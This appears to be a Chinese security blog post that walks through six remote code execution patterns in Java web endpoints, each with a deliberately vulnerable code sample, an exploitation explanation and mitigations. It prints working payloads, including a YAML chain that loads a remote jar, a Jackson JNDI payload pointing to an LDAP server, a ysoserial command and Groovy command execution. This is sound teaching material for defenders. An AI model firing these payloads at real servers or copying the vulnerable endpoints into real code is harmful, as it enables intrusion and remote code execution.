#  Java 应用程序远程代码执行场景   
 Ots安全   2024-04-17 18:06  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
**一、流程构建器**  
  
Java 代码片段包含一个漏洞，由于缺乏对参数的输入验证/清理，该漏洞允许远程执行代码 (RCE) cmd。让我们深入研究此漏洞及其利用方式。https://redteamrecipe.com/java-applications-remote-code-execution-scenarios  
```
@GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }

```  
  
**1.终点分析：**  
- 端点  
/ProcessBuilder是  
GET端点，它采用单个参数  
cmd。  
  
- 它使用 的值构造一个命令  
cmd并通过 执行它  
ProcessBuilder。  
  
**2.命令注入漏洞：**  
- arrCmd该漏洞存在于在没有适当输入验证或清理的情况下构建命令数组的过程中。  
  
- 该  
cmd参数直接用于构造命令数组，容易受到命令注入攻击。  
  
**3.开发：**  
- 攻击者可以为该  
cmd参数制作恶意负载，以在服务器上执行任意命令。  
  
- 在提供的示例中，有效负载  
cmd=whoami用于演示该漏洞，但攻击者可以执行底层操作系统允许的任何命令。  
  
**4.有效负载分析：**  
- 有效负载  
cmd=whoami指示服务器执行  
whoami命令，该命令返回当前执行命令的用户的用户名。  
  
- 由于该命令是用 执行的  
/bin/sh -c，因此它是在 shell 中执行的，从而允许执行 shell 命令。  
  
**5.缓解措施：**  
- 实施适当的输入验证和清理，以确保  
cmd参数仅包含安全值。  
  
- 使用白名单方法仅允许一组预定义的命令或操作。  
  
- 尽可能避免直接从用户输入执行命令。  
  
- 考虑以有限的权限运行应用程序，并使用 Spring Security 等安全框架来处理身份验证和授权。  
  
**6.有效负载利用示例：**  
- 攻击者可以制作有效负载来执行恶意活动，例如：  
  
- 读取敏感文件（  
/etc/passwd配置文件等）。  
  
- 在服务器上写入或删除文件。  
  
- 执行任意系统命令以获得进一步的访问权限或执行更具破坏性的操作。  
  
**二、脚本引擎管理器**  
  
Java 代码片段实现了一个 REST 端点  
/jscmd，该端点采用一个参数  
jsurl，该参数可能是指向 JavaScript 文件的 URL。然后使用 Nashorn（Java 的 JavaScript 引擎）加载并执行 JavaScript 文件。  
```
@GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }

```  
  
以下是对该代码及其利用方式的深入技术分析：  
  
**1.终点分析：**  
- 端点  
/jscmd是  
GET需要一个参数的端点  
jsurl，该参数应该是指向 JavaScript 文件的 URL。  
  
**2.漏洞分析：**  
- 此代码中的漏洞在于，它允许执行从外部源获取的任意 JavaScript 代码，而无需进行适当的验证或清理。  
  
- 该  
eval()方法用于执行从指定URL获取的JavaScript代码。  
  
**3.开发：**  
- 攻击者可以提供托管在受控 URL 上的恶意 JavaScript 文件，以在服务器上执行任意代码。  
  
- 在提供的示例中，curl  
 http://xx.yy/zz.js  
提供了有效负载来演示该漏洞。  
  
**4.有效负载分析：**  
- 有效负载表示托管于 的curl  
 http://xx.yy/zz.js文件 () 的 URL 。zz.jshttp://xx.yy  
  
- JavaScript 文件的内容包括一个  
mainOutput()调用 的函数  
java.lang.Runtime.getRuntime().exec("open -a Calculator");，该函数尝试在服务器上执行计算器应用程序。  
  
**5.缓解措施：**  
- 实施严格的输入验证，以确保参数中提供的   
jsurl指向受信任且预期的 JavaScript 文件。  
  
- 考虑使用白名单方法仅允许特定 URL 或域加载 JavaScript 文件。  
  
- 清理输入以防止任何意外或恶意代码执行。  
  
- 限制 Java 应用程序的权限，以最大限度地减少潜在漏洞的影响。  
  
**6.有效负载利用示例：**  
  
攻击者可以制作包含 JavaScript 代码的有效负载来：  
- 在服务器上执行任意系统命令。  
  
- 从服务器的文件系统读取敏感文件。  
  
- 修改或删除服务器上的文件。  
  
- 根据 Java 运行时环境的功能执行其他恶意活动。  
  
**三、YAML**  
  
Java 代码片段定义了一个  
/vuln/yarm接受 YAML 内容作为输入的 REST 端点。然后使用该类加载 YAML 内容  
Yaml，该类将 YAML 解析为 Java 对象。但是，由于不可信数据的反序列化，此代码容易受到远程代码执行 (RCE) 的攻击。  
```
@GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }

```  
  
以下是对该代码及其利用方式的详细技术分析：  
  
**1.终点分析：**  
- 该端点  
/vuln/yarm是需要包含 YAML 数据的  
GET参数的端点。  
content  
  
**2.漏洞分析：**  
- Yaml该漏洞存在于使用未经适当验证或清理的类的YAML 内容的反序列化过程中。  
  
- 如果 YAML 内容包含恶意负载，反序列化不受信任的数据可能会导致远程执行代码。  
  
**3.开发：**  
- 攻击者可以制作恶意 YAML 有效负载，其中包含在服务器上执行任意代码的指令。  
  
- 示例中提供的有效负载通过注入 YAML 有效负载来利用该漏洞，该负载通过反序列化触发任意 Java 代码的执行。  
  
**4.有效负载分析：**  
- 有效负载演示了使用 YAML 反序列化来执行任意 Java 代码的攻击向量。http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]  
  
- 有效负载指示  
Yaml解析器反序列化 Java 对象链，最终导致通过 URLClassLoader 执行任意代码。  
  
**5.缓解措施：**  
- 避免反序列化不受信任的数据或使用安全的序列化机制。  
  
- 实施输入验证和过滤，以确保仅处理受信任的 YAML 内容。  
  
- 考虑使用安全反序列化库或应用安全控制，例如内容类型验证。  
  
- 监视并记录可疑活动的反序列化尝试。  
  
**6.有效负载利用示例：**  
  
攻击者可以制作恶意 YAML 有效负载：  
- 从远程位置加载并执行任意 Java 代码。  
  
- 在服务器上执行文件系统访问、网络通信或命令执行等操作。  
  
- 利用Java运行环境中的漏洞获得未经授权的访问或提升权限。  
  
**四、Groovy**  
  
提供的 Java 代码片段定义了一个  
/groovy接受 Groovy 脚本内容作为输入的 REST 端点。然后使用该类执行 Groovy 脚本GroovyShell，该类允许动态执行   
GroovyShell 代码。但是，由于缺乏输入验证或清理，此代码容易受到远程代码执行 (RCE) 的攻击。  
```
@GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }

```  
  
以下是对该代码及其利用方式的详细技术分析：  
  
**1.终点分析：**  
- 该端点  
/groovy是需要包含 Groovy 脚本代码的  
GET参数的端点。  
content  
  
**2.漏洞分析：**  
- 该漏洞存在于用户提供的 Groovy 脚本内容未经适当验证或清理的动态执行中。  
  
- 如果脚本包含恶意命令，则执行不受信任的 Groovy 脚本内容可能会导致远程执行代码。  
  
**3.开发：**  
- 攻击者可以制作恶意 Groovy 脚本负载，其中包含在服务器上执行任意代码的指令。  
  
- 示例中提供的有效负载通过注入执行  
open -a Calculator命令的 Groovy 脚本来利用该漏洞，该命令尝试在服务器上执行计算器应用程序。  
  
**4.有效负载分析：**  
- 有效负载演示了使用 Groovy 脚本执行来执行任意系统命令的攻击向量。http://localhost:8080/rce/groovy?content="open  
 -a Calculator".execute()  
  
- 有效负载执行 Groovy 脚本  
"open -a Calculator".execute()，该脚本调用  
execute()方法来执行系统命令  
open -a Calculator。  
  
**5.缓解措施：**  
- 实施严格的输入验证和清理，以确保仅执行受信任的 Groovy 脚本内容。  
  
- 尽可能避免动态执行不受信任的代码。  
  
- 考虑使用白名单方法仅允许 Groovy 脚本中的特定操作或函数。  
  
- 限制 Java 应用程序的权限，以最大限度地减少潜在漏洞的影响。  
  
**6.有效负载利用示例：**  
  
攻击者可以制作恶意 Groovy 脚本有效负载：  
- 执行任意系统命令以在服务器上执行文件系统访问、网络通信或命令执行等操作。  
  
- 利用Java运行环境中的漏洞获得未经授权的访问或提升权限。  
  
**五、对象输入流**  
  
Java 代码片段定义了一个  
/rememberMe/vuln尝试反序列化  
rememberMecookie 值的 REST 端点。由于不可信数据的反序列化，此代码容易受到远程代码执行 (RCE) 的攻击。  
```
@RequestMapping("/rememberMe/vuln")
    public String rememberMeVul(HttpServletRequest request)
            throws IOException, ClassNotFoundException {

        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }

        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();

        return "Are u ok?";
    }

```  
  
以下是对该代码及其利用方式的详细技术分析：  
  
**1.终点分析：**  
- 端点/rememberMe/vuln是GET不带任何参数但依赖于rememberMe请求中的cookie的端点。  
  
**2.漏洞分析：**  
- 该漏洞存在于未进行适当验证或清理的rememberMecookie 值的反序列化过程中。ObjectInputStream  
  
- 如果序列化数据包含恶意负载，反序列化不受信任的数据可能会导致远程执行代码。  
  
**3.开发：**  
- 攻击者可以通过制作恶意序列化负载来利用此漏洞，该负载在反序列化时会在服务器上执行任意代码。  
  
- 示例中提供的有效负载通过使用该ysoserial工具生成执行open -a Calculator命令的序列化有效负载来利用该漏洞。  
  
**4.有效负载分析：**  
- 有效负载使用触发命令的执行来java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" | base64生成序列化的有效负载。ysoserialopen -a Calculator  
  
- 然后将序列化的有效负载编码为 Base64 格式。  
  
**5.缓解措施：**  
- 避免反序列化不受信任的数据或使用安全的序列化机制，例如 JSON 或 XML。  
  
- 实施输入验证和过滤，以确保仅处理可信的序列化数据。  
  
- 考虑使用安全反序列化库或应用安全控制，例如内容类型验证。  
  
- 监视并记录可疑活动的反序列化尝试。  
  
**6.有效负载利用示例：**  
  
攻击者可以制作恶意序列化有效负载：  
- 执行任意系统命令以在服务器上执行文件系统访问、网络通信或命令执行等操作。  
  
- 利用 Java 反序列化过程中的漏洞来获取未经授权的访问或提升权限。  
  
**六、对象映射器**  
  
Java 代码片段定义了一个/jackson带有payload参数的 REST 端点。它利用 Jackson 库将 JSON 数据反序列化为 Java 对象，然后将它们序列化回 JSON。然而，由于使用远程代码执行 (RCE) 来enableDefaultTyping()实现多态反序列化，因此该代码容易受到远程代码执行 (RCE) 的攻击。  
```
@RequestMapping("/jackson")
    public void Jackson(String payload) {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            Object obj = mapper.readValue(payload, Object.class);
            mapper.writeValueAsString(obj);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

```  
  
以下是对该代码及其利用方式的详细技术分析：  
  
**1.终点分析：**  
- 该端点  
/jackson是需要包含 JSON 数据的  
GET参数的端点。  
payload  
  
**2.漏洞分析：**  
- enableDefaultTyping()该漏洞存在于类方法的使用中  
ObjectMapper。此方法启用默认类型，允许 Jackson 反序列化对象而不指定其确切类型。  
  
- 如果 JSON 数据包含特制的有效负载，则启用默认类型可能会导致远程执行代码。  
  
**3.开发：**  
- 攻击者可以通过制作恶意 JSON 负载来触发服务器上任意代码的执行来利用此漏洞。  
  
- 示例中提供的有效负载包含类名 (   
org.jsecurity.realm.jndi.JndiRealmFactory) 及其关联属性，这些属性可能是较大攻击链的一部分。  
  
**4.有效负载分析：**  
- 示例中提供的有效负载为：  
  
```
  String payload = "[\"org.jsecurity.realm.jndi.JndiRealmFactory\", {\"jndiNames\":\"ldap://30.196.97.50:1389/yto8pc\"}]";
```  
- 此负载表示一个 JSON 数组，其中第一个元素是类名称，第二个元素是一组属性。它尝试使用指向潜在恶意 LDAP 服务器的  
JndiRealmFactory属性进行实例化。  
jndiNames  
  
**5.缓解措施：**  
- enableDefaultTyping()禁用Jackson 中的默认键入 ( )  
ObjectMapper以防止多态反序列化。  
  
- 在反序列化之前实施严格的输入验证并清理输入。  
  
- 使用白名单方法仅允许反序列化已知且可信的类型。  
  
- 考虑使用不支持多态反序列化的替代序列化格式，例如 Protocol Buffers 或 JSON-B。  
  
**6.有效负载利用示例：**  
- 攻击者可以制作恶意 JSON 有效负载：  
  
- 利用反序列化过程中的漏洞在服务器上执行任意代码。  
  
- 在服务器上执行文件系统访问、网络通信或命令执行等操作。  
  
其它文章参考：  
- https://github.com/JoyChou93/java-sec-code?tab=readme-ov-file  
  
- https://devsecopsguides.com/  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
